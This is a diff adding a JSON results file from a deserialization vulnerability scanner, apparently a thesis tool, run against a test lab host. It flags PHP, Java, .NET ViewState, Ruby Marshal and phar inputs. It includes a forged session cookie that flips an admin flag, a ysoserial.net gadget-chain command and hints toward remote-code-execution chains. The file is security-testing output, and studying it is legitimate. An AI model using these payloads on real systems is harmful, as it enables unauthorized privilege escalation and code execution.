@@ -1,0 +1,364 @@
+{
+    "metadata": {
+        "tool": "ethicalQuoc",
+        "version": "2025.1.0.0",
+        "scan_type": "Hybrid",
+        "phase": "analyze",
+        "target": "results/test_analyze.json",
+        "timestamp": "2026-09-02T14:15:04.750275"
+    },
+    "summary": {
+        "total_vectors": 8
+    },
+    "vectors": [
+        {
+            "vector": {
+                "url": "https://testlab.example.com/my-account",
+                "method": "GET",
+                "location": "cookie",
+                "name": "session",
+                "original_value": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30="
+            },
+            "normalized": [
+                "O:4:\"User\":2:{s:8:\"username\";s:6:\"wiener\";s:5:\"admin\";b:0;}"
+            ],
+            "fingerprint": {
+                "value": "O:4:\"User\":2:{s:8:\"username\";s:6:\"wiener\";s:5:\"admin\";b:0;}",
+                "type": "PHP",
+                "confidence": "High",
+                "risk_level": "High",
+                "subtype": null,
+                "gadget_detected": false,
+                "gadget_hints": [],
+                "all_candidates": {
+                    "PHP": 9
+                }
+            },
+            "exploit_analysis": {
+                "exploitable": true,
+                "exploit_type": "Privilege Escalation — Boolean Flip",
+                "score": 6,
+                "severity": "High",
+                "confidence_source": "static_signature",
+                "confirmation_status": "Suspected",
+                "display_severity": "Suspected-High",
+                "suggested_probe": "flip_boolean",
+                "notes": "Boolean field detected — try flipping b:0 → b:1"
+            },
+            "mutations": [
+                {
+                    "type": "flip_boolean",
+                    "chain": null,
+                    "command": null,
+                    "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30=",
+                    "payload_urlencoded": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30%3D",
+                    "location": "cookie",
+                    "name": "session",
+                    "url": "https://testlab.example.com/my-account",
+                    "method": "GET",
+                    "encoding": "base64"
+                }
+            ]
+        },
+        {
+            "vector": {
+                "url": "https://testlab.example.com/my-account",
+                "method": "GET",
+                "location": "header",
+                "name": "Cookie",
+                "original_value": "session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30=; other=abc123; tracking=xyz789"
+            },
+            "normalized": [
+                "O:4:\"User\":2:{s:8:\"username\";s:6:\"wiener\";s:5:\"admin\";b:0;}"
+            ],
+            "fingerprint": {
+                "value": "O:4:\"User\":2:{s:8:\"username\";s:6:\"wiener\";s:5:\"admin\";b:0;}",
+                "type": "PHP",
+                "confidence": "High",
+                "risk_level": "High",
+                "subtype": null,
+                "gadget_detected": false,
+                "gadget_hints": [],
+                "all_candidates": {
+                    "PHP": 9
+                }
+            },
+            "exploit_analysis": {
+                "exploitable": true,
+                "exploit_type": "Privilege Escalation — Boolean Flip",
+                "score": 6,
+                "severity": "High",
+                "confidence_source": "static_signature",
+                "confirmation_status": "Suspected",
+                "display_severity": "Suspected-High",
+                "suggested_probe": "flip_boolean",
+                "notes": "Boolean field detected — try flipping b:0 → b:1"
+            },
+            "mutations": [
+                {
+                    "type": "flip_boolean",
+                    "chain": null,
+                    "command": null,
+                    "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30=",
+                    "payload_urlencoded": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30%3D",
+                    "location": "header",
+                    "name": "Cookie",
+                    "url": "https://testlab.example.com/my-account",
+                    "method": "GET",
+                    "encoding": "base64"
+                }
+            ]
+        },
+        {
+            "vector": {
+                "url": "https://testlab.example.com/api/session",
+                "method": "GET",
+                "location": "header",
+                "name": "X-Session-Token",
+                "original_value": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA=="
+            },
+            "normalized": [
+                "\u0000\u0005sr\u0000\u0011java.util.HashMap",
+                "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA"
+            ],
+            "fingerprint": {
+                "value": "\u0000\u0005sr\u0000\u0011java.util.HashMap rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA",
+                "type": "Java",
+                "confidence": "High",
+                "risk_level": "High",
+                "subtype": null,
+                "gadget_detected": false,
+                "gadget_hints": [],
+                "all_candidates": {
+                    "Java": 10
+                }
+            },
+            "exploit_analysis": {
+                "exploitable": true,
+                "exploit_type": "URLDNS — Deserialization Confirmed",
+                "score": 5,
+                "severity": "Medium",
+                "confidence_source": "static_signature",
+                "confirmation_status": "Suspected",
+                "display_severity": "Suspected-Medium",
+                "suggested_probe": "urldns_probe",
+                "notes": "URLDNS gadget detected — server confirmed to deserialize | Use ysoserial URLDNS to verify, then try RCE chains"
+            },
+            "mutations": []
+        },
+        {
+            "vector": {
+                "url": "https://testlab.example.com/invoker/JMSInvokerServlet",
+                "method": "POST",
+                "location": "header",
+                "name": "Content-Type",
+                "original_value": "application/x-java-serialized-object"
+            },
+            "normalized": [
+                "application/x-java-serialized-object"
+            ],
+            "fingerprint": {
+                "value": "application/x-java-serialized-object",
+                "type": "Unknown",
+                "confidence": "Low",
+                "risk_level": "Low",
+                "subtype": null,
+                "gadget_detected": false,
+                "gadget_hints": [],
+                "all_candidates": {}
+            },
+            "exploit_analysis": {
+                "exploitable": false,
+                "exploit_type": null,
+                "score": 0,
+                "severity": "Low",
+                "confidence_source": "static_signature",
+                "confirmation_status": "Suspected",
+                "display_severity": "Suspected-Low",
+                "suggested_probe": "unknown",
+                "notes": ""
+            },
+            "mutations": []
+        },
+        {
+            "vector": {
+                "url": "https://testlab.example.com/Default.aspx",
+                "method": "POST",
+                "location": "form_body",
+                "name": "__VIEWSTATE",
+                "original_value": "/wEPDwUJODk5MDMyNjU5D2QWAgIDD2QWAgIBD2QWAgIBDw8WAh4EVGV4dAUDMS4wZGQY"
+            },
+            "normalized": [
+                "/wEPDwUJODk5MDMyNjU5D2QWAgIDD2QWAgIBD2QWAgIBDw8WAh4EVGV4dAUDMS4wZGQY"
+            ],
+            "fingerprint": {
+                "value": "/wEPDwUJODk5MDMyNjU5D2QWAgIDD2QWAgIBD2QWAgIBDw8WAh4EVGV4dAUDMS4wZGQY",
+                "type": "DotNet",
+                "confidence": "Medium",
+                "risk_level": "High",
+                "subtype": "ASP.NET ViewState",
+                "gadget_detected": false,
+                "gadget_hints": [],
+                "all_candidates": {
+                    "DotNet": 5
+                }
+            },
+            "exploit_analysis": {
+                "exploitable": true,
+                "exploit_type": "ASP.NET ViewState Tampering",
+                "score": 7,
+                "severity": "High",
+                "confidence_source": "static_signature",
+                "confirmation_status": "Suspected",
+                "display_severity": "Suspected-High",
+                "suggested_probe": "viewstate",
+                "notes": "ViewState detected — try ysoserial.net with -g TypeConfuseDelegate"
+            },
+            "mutations": [
+                {
+                    "error": "ysoserial.net not found",
+                    "hint": "Place ysoserial.exe at: D:\\Thesis\\Thesis\\Analyze/third_tool/dotnet/ysoserial.exe",
+                    "command": "ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c 'id' -o base64"
+                }
+            ]
+        },
+        {
+            "vector": {
+                "url": "https://testlab.example.com/dashboard",
+                "method": "GET",
+                "location": "cookie",
+                "name": "rails_session",
+                "original_value": "BAhvOglPYmplY3QA"
+            },
+            "normalized": [
+                "BAhvOglPYmplY3QA"
+            ],
+            "fingerprint": {
+                "value": "BAhvOglPYmplY3QA",
+                "type": "Ruby",
+                "confidence": "High",
+                "risk_level": "High",
+                "subtype": null,
+                "gadget_detected": false,
+                "gadget_hints": [],
+                "all_candidates": {
+                    "Ruby": 8
+                }
+            },
+            "exploit_analysis": {
+                "exploitable": true,
+                "exploit_type": "Ruby Marshal Deserialization",
+                "score": 3,
+                "severity": "Medium",
+                "confidence_source": "static_signature",
+                "confirmation_status": "Suspected",
+                "display_severity": "Suspected-Medium",
+                "suggested_probe": "ruby_marshal",
+                "notes": "Marshal \\x04\\x08 header detected | Try Marshal-based gadget chain (e.g. via a ruby -e helper script)"
+            },
+            "mutations": [
+                {
+                    "error": "ruby not found or timed out",
+                    "hint": "Install Ruby and ensure 'ruby' is on PATH to generate Marshal payloads",
+                    "command": "ruby -e \"puts Base64.strict_encode64(Marshal.dump(...))\""
+                },
+                {
+                    "error": "ruby not found or timed out",
+                    "hint": "Install Ruby and ensure 'ruby' is on PATH to generate Marshal payloads",
+                    "command": "ruby -e \"puts Base64.strict_encode64(Marshal.dump(...))\""
+                },
+                {
+                    "error": "ruby not found or timed out",
+                    "hint": "Install Ruby and ensure 'ruby' is on PATH to generate Marshal payloads",
+                    "command": "ruby -e \"puts Base64.strict_encode64(Marshal.dump(...))\""
+                }
+            ]
+        },
+        {
+            "vector": {
+                "url": "https://testlab.example.com/download",
+                "method": "GET",
+                "location": "url_param",
+                "name": "file",
+                "original_value": "phar://uploads/avatar.jpg/test.txt"
+            },
+            "normalized": [
+                "phar://uploads/avatar.jpg/test.txt"
+            ],
+            "fingerprint": {
+                "value": "phar://uploads/avatar.jpg/test.txt",
+                "type": "Wrapper",
+                "confidence": "Medium",
+                "risk_level": "High",
+                "subtype": "Dangerous Wrapper Protocol",
+                "gadget_detected": false,
+                "gadget_hints": [],
+                "all_candidates": {
+                    "PHP": 2,
+                    "Wrapper": 4
+                }
+            },
+            "exploit_analysis": {
+                "exploitable": true,
+                "exploit_type": "Phar Deserialization",
+                "score": 8,
+                "severity": "High",
+                "confidence_source": "static_signature",
+                "confirmation_status": "Suspected",
+                "display_severity": "Suspected-High",
+                "suggested_probe": "phar_deser",
+                "notes": "Wrapper detected: phar:// → Phar Deserialization"
+            },
+            "mutations": []
+        },
+        {
+            "vector": {
+                "url": "https://testlab.example.com/my-account",
+                "method": "GET",
+                "location": "header",
+                "name": "Cookie",
+                "original_value": "tracking=xyz789; other=abc123; session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30="
+            },
+            "normalized": [
+                "O:4:\"User\":2:{s:8:\"username\";s:6:\"wiener\";s:5:\"admin\";b:0;}"
+            ],
+            "fingerprint": {
+                "value": "O:4:\"User\":2:{s:8:\"username\";s:6:\"wiener\";s:5:\"admin\";b:0;}",
+                "type": "PHP",
+                "confidence": "High",
+                "risk_level": "High",
+                "subtype": null,
+                "gadget_detected": false,
+                "gadget_hints": [],
+                "all_candidates": {
+                    "PHP": 9
+                }
+            },
+            "exploit_analysis": {
+                "exploitable": true,
+                "exploit_type": "Privilege Escalation — Boolean Flip",
+                "score": 6,
+                "severity": "High",
+                "confidence_source": "static_signature",
+                "confirmation_status": "Suspected",
+                "display_severity": "Suspected-High",
+                "suggested_probe": "flip_boolean",
+                "notes": "Boolean field detected — try flipping b:0 → b:1"
+            },
+            "mutations": [
+                {
+                    "type": "flip_boolean",
+                    "chain": null,
+                    "command": null,
+                    "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30=",
+                    "payload_urlencoded": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30%3D",
+                    "location": "header",
+                    "name": "Cookie",
+                    "url": "https://testlab.example.com/my-account",
+                    "method": "GET",
+                    "encoding": "base64"
+                }
+            ]
+        }
+    ]
+}
